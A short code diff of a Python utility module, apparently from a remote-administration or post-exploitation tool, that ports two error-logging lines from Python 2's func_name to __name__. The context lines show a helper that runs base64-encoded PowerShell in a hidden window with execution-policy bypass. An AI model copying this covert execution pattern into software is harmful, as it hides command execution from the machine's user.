@@ -374,7 +374,7 @@ def powershell(code):
         powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
         return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
     except Exception as e:
-        log("{} error: {}".format(powershell.func_name, str(e)))
+        log("{} error: {}".format(powershell.__name__, str(e)))
 
 def display(output, color=None, style=None, end='\n', event=None, lock=None):
     """
@@ -411,7 +411,7 @@ def color():
         import random
         return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
     except Exception as e:
-        log("{} error: {}".format(color.func_name, str(e)))
+        log("{} error: {}".format(color.__name__, str(e)))
 
 def imgur(source, api_key=None):
     """
